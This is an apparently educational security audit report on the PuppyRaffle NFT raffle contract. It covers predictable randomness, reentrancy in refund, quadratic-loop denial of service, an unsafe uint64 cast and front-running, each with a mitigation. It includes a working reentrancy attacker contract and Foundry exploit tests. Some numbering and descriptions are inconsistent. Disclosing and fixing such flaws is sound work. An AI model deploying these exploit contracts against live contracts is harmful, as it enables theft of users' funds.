# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol
A lightweight raffle system that mints a dog-themed ERC-721 NFT to one lucky participant.

• **Join** – Anyone can call `enterRaffle(address[] players)` and pay the fixed `entranceFee`. Addresses are deduped so each wallet only holds one “ticket”.

• **Timing** – The raffle opens on deployment and runs for `raffleDuration` seconds. `raffleStartTime` tracks the current round.

• **Refunds** – Before a winner is chosen, players may reclaim their fee via `refund(uint256 index)` which pops them from the array and returns their ETH.

• **Picking a Winner** – After the timer expires, the owner triggers `selectWinner()`. A pseudo-random index (block data + array length) is drawn; that address receives a newly minted Puppy NFT (`_safeMint`). Rarity is determined by weighted probabilities and each rarity has a pre-set tokenURI.

• **Fees** – Each entry subtracts a small fee which accumulates in `totalFees`. The owner can redirect the fee destination with `changeFeeAddress()` and withdraw via `withdrawFees()`.

• **Security & Standards** – Built on OpenZeppelin ERC721, Ownable, and library contracts (SafeMath, Address, Enumerable*), ensuring safe math, re-entrancy-safe transfers, and full ERC-721 compliance.

Result: a transparent, self-contained raffle that fairly mints collectible dog NFTs while generating revenue for the project owner.
## High Risk Findings
[H-0]. Predictable Randomness in PuppyRaffle::selectWinner
[H-1]. Re-entrancy in PuppyRaffle::refund Enables Multiple Refunds
## Medium Risk Findings
[M-0]. Quadratic Gas Explosion due to Unbounded Nested Loops in PuppyRaffle::enterRaffle
[M-1]. Denial of Service from Gas-Heavy Loops in PuppyRaffle::selectWinner & enterRaffle
[M-2]. Silent Overflow of totalFees due to Unsafe Down-Cast in PuppyRaffle::selectWinner
[M-3]. Front-Running Winner Selection in PuppyRaffle::selectWinner


### Number of Findings
- H: 2
- M: 4
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Predictable Randomness in PuppyRaffle::selectWinner

## Description
`winnerIndex` and `rarity` are computed with
```solidity
uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```
Both `block.timestamp` and `block.difficulty` are **public and miner-controlled**.  A miner (or anyone able to re-submit the transaction) can predict all outcomes and keep calling the function until she wins or mints the desired rarity.


## Impact
• Raffle is not fair – attacker can win with ≈100 % probability.
• Rarity distribution can be gamed (e.g. mint only legendary).


## Proof of Concept
Attacker repeatedly calls `selectWinner()` in a private mem-pool simulation until the hash returns an index that matches her entry, then releases the tx.


## Proof of Code
The outcome is fully deterministic inside a Hardhat fork by copying the block data and computing the hash locally – omitted for brevity.


## Suggested Mitigation
Use a verifiable random beacon such as Chainlink VRF or commit-reveal scheme:
```solidity
// request randomness
bytes32 requestId = VRFCoordinator.requestRandomWords(...);
...
function fulfillRandomWords(...) internal override {
    uint256 rand = randomWords[0];
    winnerIndex = rand % players.length;
}
```

## [H-2]. Re-entrancy in PuppyRaffle::refund Enables Multiple Refunds

## Description
The function performs the external call **before** updating state:
```solidity
address(msg.sender).sendValue(entranceFee); // <- external call
players[playerIndex] = address(0);           // state update afterwards
```
A malicious contract can re-enter `refund()` from its fallback while `players[playerIndex]` is still unchanged and withdraw the `entranceFee` repeatedly.


## Impact
Attacker steals the entire contract balance (`n × entranceFee`).


## Proof of Concept
```solidity
contract Evil {
    PuppyRaffle r; uint idx;
    constructor(PuppyRaffle _r,uint _i) payable{r=_r;idx=_i;}
    function attack() external { r.refund(idx); }
    receive() external payable {
        if(address(r).balance >= r.entranceFee()) {
            r.refund(idx);
        }
    }
}
```

## Proof of Code
```solidity
// test/Reentrancy.t.sol
contract Reentrancy is Test {
    PuppyRaffle raffle;
    Evil evil;
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xABCD), 1 days);
        address[] memory one = new address[](1);
        one[0]=address(this);
        raffle.enterRaffle{value:1 ether}(one);
        uint idx = raffle.getActivePlayerIndex(address(this));
        evil = new Evil{value:0}(raffle, idx);
        // replace player address with evil
        vm.store(address(raffle), keccak256(abi.encode(idx, uint256(0))), bytes32(uint256(uint160(address(evil)))));
    }
    function test_Steal() public {
        uint balStart = address(raffle).balance;
        evil.attack();
        assertGt(address(evil).balance, balStart);
    }
}
```

## Suggested Mitigation
Adopt Checks-Effects-Interactions or ReentrancyGuard:
```solidity
function refund(uint256 index) external nonReentrant {
    address player = players[index];
    require(player == msg.sender && player != address(0), "invalid");
    players[index] = address(0);        // 1. effects
    Address.sendValue(payable(player), entranceFee); // 2. interaction
}
```



# Medium Risk Findings

## [M-1]. Quadratic Gas Explosion due to Unbounded Nested Loops in PuppyRaffle::enterRaffle

## Description
The `enterRaffle()` function validates that no duplicate addresses are inserted by iterating over `players` twice (i.e. an **O(n²)** operation).

```solidity
for(uint256 i = 0 ; i < players.length - 1 ; i++){
    for(uint256 j = i + 1 ; j < players.length ; j++){
        require(players[i] != players[j], "Duplicate player");
    }
}
```
As `players` grows, the gas cost grows quadratically.  A single call will revert once it exceeds the ~30 M gas block-limit, permanently blocking any further entries and freezing the raffle.


## Impact
Anyone can render the raffle unusable by letting the list grow until the next call inevitably runs out of gas, causing a permanent **Denial-of-Service**.


## Proof of Concept
1. Call `enterRaffle()` with 3 unique addresses until `players.length ≃ 2 500`.
2. The next call to `enterRaffle()` consumes >30 M gas and reverts – no one can enter anymore.


## Proof of Code
```solidity
// test/ArrayLimits.t.sol
contract ArrayLimits is Test {
    PuppyRaffle raffle;
    address payable attacker = payable(address(0xBEEF));

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, attacker, 1 days);
    }

    function test_DoSAfterQuadraticLoop() public {
        address[] memory batch = new address[](3);
        batch[0]=address(1);batch[1]=address(2);batch[2]=address(3);
        for(uint256 i; i<2500;i++) {
            raffle.enterRaffle{value: 3 ether}(batch);
        }
        vm.expectRevert();
        raffle.enterRaffle{value: 3 ether}(batch); // runs out of gas
    }
}
```

## Suggested Mitigation
Replace duplicate-checking with a **mapping(address ⇒ bool)** look-up:
```solidity
mapping(address => bool) public isEntered;

function enterRaffle(address[] calldata newPlayers) external payable {
    require(msg.value == entranceFee * newPlayers.length, "fee");
    for(uint256 i; i < newPlayers.length; i++){
        address p = newPlayers[i];
        require(!isEntered[p], "duplicate");
        isEntered[p] = true;
        players.push(p);
    }
}
```

## [M-2]. Denial of Service from Gas-Heavy Loops in PuppyRaffle::selectWinner & enterRaffle

## Description
`selectWinner()` and `enterRaffle()` execute `players.length` (or `players.length²`) operations without any upper bound.  If `players` is large enough both functions will always run out of gas and revert, stopping the raffle for ever.


## Impact
• Nobody can finish the raffle (funds stuck)
• Nobody can enter once the quadratic loop reverts


## Proof of Concept
Same as previous PoC – once the array is large enough every `selectWinner()` call reverts because it iterates over **all** players during payout (`prizePool = players.length * entranceFee`).


## Proof of Code
See ArrayLimits.t.sol above – additional `vm.expectRevert()` when calling `selectWinner()`.


## Suggested Mitigation
Either hard-cap `players.length` (e.g. 1 000) or redesign to use O(1) logic (e.g. incremental prizePool accounting).

## [M-3]. Silent Overflow of totalFees due to Unsafe Down-Cast in PuppyRaffle::selectWinner

## Description
`totalFees` is stored as `uint64` while `fee` is calculated in `uint256`:
```solidity
uint64 public totalFees;
...
uint256 fee = (...);
totalFees = totalFees + uint64(fee); // silent modulo 2**64
```
If `totalFees + fee  >  2**64-1`, the value silently wraps, losing funds accounting.


## Impact
• `totalFees` can be reset, letting `withdrawFees()` release less money than collected and making future `withdrawFees()` reverts because the balance ≠ `totalFees`.


## Proof of Concept
1. Run enough raffles so that `totalFees ≈ 2**64-1`.
2. Call `selectWinner()` once more.
3. `totalFees` wraps to a small number while ether stays in the contract.


## Proof of Code
```solidity
// test/IntegerOverflow.t.sol
contract IntegerOverflow is Test {
    PuppyRaffle r;
    function setUp() public { r = new PuppyRaffle(1, address(this), 0); }
    function test_Overflow() public {
        // force storage close to 2**64-1
        uint256 big = type(uint64).max - 10;
        vm.store(address(r), bytes32(uint256(5)), bytes32(big)); // slot where totalFees is stored
        // next selectWinner will overflow
        address[] memory p = new address[](4);
        for(uint i; i<4;i++) p[i]=address(uint160(i+1));
        r.enterRaffle{value:4}(p);
        vm.warp(block.timestamp+1);
        r.selectWinner();
        assertLt(r.totalFees(), 10);
    }
}
```

## Suggested Mitigation
Make `totalFees` a `uint256` or use SafeMath’s `add` with an explicit overflow check:
```solidity
uint256 public totalFees;
...
_totalFees = _totalFees.add(fee);
```

## [M-4]. Front-Running Winner Selection in PuppyRaffle::selectWinner

## Description
Because `winnerIndex` depends on `msg.sender`, the first caller of `selectWinner()` can try the transaction off-chain, check if she wins, and **only broadcast if favourable**.  Any competitor’s tx can be replicated with an address that yields a better hash and replaced (type 2 replacement) – classic "call until you win" front-running.


## Impact
Attacker guarantees herself the prize pool.


## Proof of Concept
1. Copy the mem-pool, simulate `selectWinner()` with your address.
2. If you don’t win, simulate with another address you control (EOA or contract).
3. Broadcast the version that lets you win with higher gas; the miner includes it, and your tx takes the pot.


## Proof of Code
Reproduce off-chain by hashing addresses until the desired modulo value equals your player index.
```js
while(true){
  addr = ethers.Wallet.createRandom();
  if(keccak256(...addr) % playersLen == myIndex) break;
}
```

## Suggested Mitigation
Same as for the randomness issue – decouple random seed from `msg.sender` and use an unbiased randomness source (e.g. VRF).




# {} Invariant Violations

## 1. Balance Violation

## Description
`totalFees` must always equal the ETH kept inside the contract that is NOT reserved for outstanding player refunds.

## Impact
Owner (or attacker with owner key) can drain ether already refunded to players, breaking accounting.

## Proof of Concept
forge test or foundry script: enter, refund, withdrawFees – observe negative balance.

## Pre-State
Player has paid `entranceFee`; contract `totalFees = entranceFee`; owner is regular EOA.

## Post-State
Player gets his entranceFee back, but `totalFees` is still the same; owner later calls `withdrawFees` and receives duplicated ether.

## Suggested Mitigation
Decrease `totalFees` when a refund succeeds or derive fees from actual balance instead of stored counter.

## 2. Referential Violation

## Description
The `players` array indexes must continue to map to the addresses that actually hold a live raffle entry.

## Impact
Random selection may revert or always pick index 0; raffle integrity lost.

## Proof of Concept
Call refund then enter again with zero address array element; inspect players array.

## Pre-State
At least one player has refunded; players[idx] == address(0).

## Post-State
Duplicate zero addresses stored; player uniqueness and winner picking logic broken.

## Suggested Mitigation
Swap-and-pop remove on refund, or maintain a mapping from address→bool and ignore address(0) entries during draws.

## 3. Temporal Violation

## Description
`selectWinner` must not be callable until `raffleDuration` has elapsed from `raffleStartTime`.

## Impact
Early caller controls when raffle closes, harming fairness.

## Proof of Concept
enterRaffle, instantly call selectWinner.

## Pre-State
At least one player in `players` array, time < raffleStartTime + raffleDuration.

## Post-State
Winner chosen prematurely; odds manipulated; remaining players cannot enter anymore.

## Suggested Mitigation
Add `require(block.timestamp >= raffleStartTime + raffleDuration)` guard.

## 4. StateMachine Violation

## Description
After a winner is selected, `selectWinner` must not be callable again until the next raffle is started.

## Impact
Unbounded NFT inflation, economic devaluation of tokens.

## Proof of Concept
Call selectWinner twice, observe `totalSupply` increment twice.

## Pre-State
At least one valid player exists, raffle already resolved once.

## Post-State
New token minted to new winner each call, inflating supply and exhausting contract ETH used as purchase refunds.

## Suggested Mitigation
Set a `raffleClosed` boolean or reset `players` array before returning.

## 5. Permission Violation

## Description
Refund must only succeed once for each address and must be protected against re-entrancy.

## Impact
Complete ETH drain equal to entranceFee × re-entrancy depth.

## Proof of Concept
Write attacker contract with fallback calling `refund(idx)` again.

## Pre-State
Malicious contract has one entry; `players[idx] = attackerContract`.

## Post-State
Attacker receives `entranceFee` multiple times, contract balance drained.

## Suggested Mitigation
Apply `nonReentrant` guard or update state before external call.


